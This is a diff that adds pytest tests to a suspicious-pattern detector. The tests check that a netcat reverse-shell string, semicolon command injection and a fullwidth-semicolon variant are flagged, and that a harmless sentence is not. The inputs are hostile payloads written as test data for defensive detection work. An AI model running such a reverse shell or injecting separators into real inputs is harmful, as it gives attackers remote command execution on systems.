@@ -79,3 +79,23 @@ async def test_dollar_brace_math_detected(sus_patterns_manager_with_detection):
 @pytest.mark.asyncio
 async def test_benign_shell_var_not_flagged(sus_patterns_manager_with_detection):
     assert not await _detected(sus_patterns_manager_with_detection, "export PATH=${HOME}/bin")
+
+
+@pytest.mark.asyncio
+async def test_netcat_pipe_revshell_detected(sus_patterns_manager_with_detection):
+    assert await _detected(sus_patterns_manager_with_detection, "|(nc -e /bin/sh 10.0.0.1 4444)")
+
+
+@pytest.mark.asyncio
+async def test_bare_separator_command_detected(sus_patterns_manager_with_detection):
+    assert await _detected(sus_patterns_manager_with_detection, "test;ls")
+
+
+@pytest.mark.asyncio
+async def test_fullwidth_semicolon_command_detected(sus_patterns_manager_with_detection):
+    assert await _detected(sus_patterns_manager_with_detection, "test；ls")
+
+
+@pytest.mark.asyncio
+async def test_benign_semicolon_text_not_flagged(sus_patterns_manager_with_detection):
+    assert not await _detected(sus_patterns_manager_with_detection, "first do this; then enjoy your day")
